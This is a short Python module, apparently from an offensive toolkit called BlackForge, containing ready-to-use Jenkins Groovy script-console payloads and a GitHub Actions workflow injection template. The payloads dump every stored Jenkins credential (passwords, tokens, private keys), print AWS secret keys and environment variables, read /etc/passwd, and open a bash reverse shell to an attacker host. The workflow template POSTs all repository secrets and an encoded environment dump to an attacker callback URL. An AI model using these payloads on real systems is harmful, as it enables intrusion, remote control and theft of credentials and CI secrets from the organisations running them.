"""Jenkins Groovy payloads and workflow injection templates."""

from __future__ import annotations

from typing import Dict

JENKINS_GROOVY_PAYLOADS: Dict[str, str] = {
    "whoami": "println(['id'].execute().text)",
    "hostname": "println(['hostname'].execute().text)",
    "env_dump": "System.getenv().each { println it }",
    "cred_dump": """
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernamePasswordCredentials
import jenkins.model.Jenkins

def creds = CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.Credentials.class, Jenkins.instance, null, null)
creds.each { c ->
    try {
        println("ID: ${c.id} | TYPE: ${c.class.simpleName} | DESC: ${c.description}")
        if (c.hasProperty('username')) println("  USER: ${c.username}")
        if (c.hasProperty('password')) println("  PASS: ${c.password}")
        if (c.hasProperty('secret'))   println("  SECRET: ${c.secret}")
        if (c.hasProperty('apiToken')) println("  TOKEN: ${c.apiToken}")
        if (c.hasProperty('privateKeySource')) println("  KEY: ${c.privateKeySource.privateKey}")
    } catch (e) {}
}
""",
    "aws_env": (
        "println(System.getenv('AWS_ACCESS_KEY_ID')"
        " + ':' + System.getenv('AWS_SECRET_ACCESS_KEY'))"
    ),
    "read_file": "println(new File('/etc/passwd').text)",
    "reverse_shell": "['bash','-c','bash -i >& /dev/tcp/ATTACKER/4444 0>&1'].execute()",
}

GITHUB_EXFIL_WORKFLOW = """\
# BlackForge PoC - Secrets Exfiltration via Workflow Injection
# Inject via PR if github.event.pull_request.title is used unsanitized in run: steps

name: ci
on: [pull_request]
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Dump all secrets
        run: |
          curl -s -X POST "https://ATTACKER_CALLBACK/" \\
            -d "secrets=${{ toJSON(secrets) }}&env=$(env | base64)"
        env:
          ALL_SECRETS: ${{ toJSON(secrets) }}
"""
